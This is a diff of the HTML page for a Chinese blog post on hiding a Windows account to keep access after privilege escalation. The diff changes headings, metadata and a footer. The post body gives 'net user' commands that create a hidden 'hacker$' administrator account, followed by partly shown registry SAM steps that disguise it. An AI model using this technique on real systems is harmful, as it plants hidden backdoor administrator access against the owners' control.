@@ -16,12 +16,12 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 前言提权成功后，维持权限可以添加隐藏账户。 0x02 命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   0x03 注册表隐藏 更改 HKEY_LOC">
+    <meta name="description" content="0、简介提权成功后，维持权限可以添加隐藏账户。 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   2、注册表隐藏 更改 HKEY_LOCAL_MACHIN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="win添加隐藏账户">
 <meta property="og:url" content="http://example.com/2019/12/06/win%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog">
-<meta property="og:description" content="0x01 前言提权成功后，维持权限可以添加隐藏账户。 0x02 命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   0x03 注册表隐藏 更改 HKEY_LOC">
+<meta property="og:description" content="0、简介提权成功后，维持权限可以添加隐藏账户。 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   2、注册表隐藏 更改 HKEY_LOCAL_MACHIN">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206164548.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206151940.png">
@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206160517.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206161451-1024x726.png">
 <meta property="article:published_time" content="2019-12-06T08:27:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T10:11:57.227Z">
+<meta property="article:modified_time" content="2024-07-01T12:41:05.550Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="后门">
 <meta name="twitter:card" content="summary_large_image">
@@ -78,7 +78,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -241,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          177 字
+          179 字
         
       </span>
     
@@ -302,15 +302,15 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>提权成功后，维持权限可以添加隐藏账户。</p>
-<h4 id="0x02-命令行隐藏"><a href="#0x02-命令行隐藏" class="headerlink" title="0x02 命令行隐藏"></a>0x02 命令行隐藏</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户时使用$符号,这样添加的用户,命令行不会显示</span><br>net user hacker$ password /add<br>net localgroup administrators hacker$ /add<br></code></pre></td></tr></table></figure>
+                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>提权成功后，维持权限可以添加隐藏账户。</p>
+<h4 id="1、命令行隐藏"><a href="#1、命令行隐藏" class="headerlink" title="1、命令行隐藏"></a>1、命令行隐藏</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户时使用$符号,这样添加的用户,命令行不会显示</span><br>net user hacker$ password /add<br>net localgroup administrators hacker$ /add<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206164548.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li>在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206151940.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="0x03-注册表隐藏"><a href="#0x03-注册表隐藏" class="headerlink" title="0x03 注册表隐藏"></a>0x03 注册表隐藏</h4><ol>
+<h4 id="2、注册表隐藏"><a href="#2、注册表隐藏" class="headerlink" title="2、注册表隐藏"></a>2、注册表隐藏</h4><ol>
 <li>更改 <em>HKEY_LOCAL_MACHINE\SAM\SAM</em> 权限，为 Administrators 组添加权限 </li>
 <li>F5刷新一下,在注册表中找到 <em>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\hacker$</em> ，找到其类型<em>000003EB</em>后和 <em>hacker</em>$一同导出 </li>
 <li>找到 <em>Administrator</em> 对应类型 <em>000001F4</em> 导出，编辑导出的文件 </li>
@@ -486,30 +486,6 @@
        <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
   
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
   
   
   
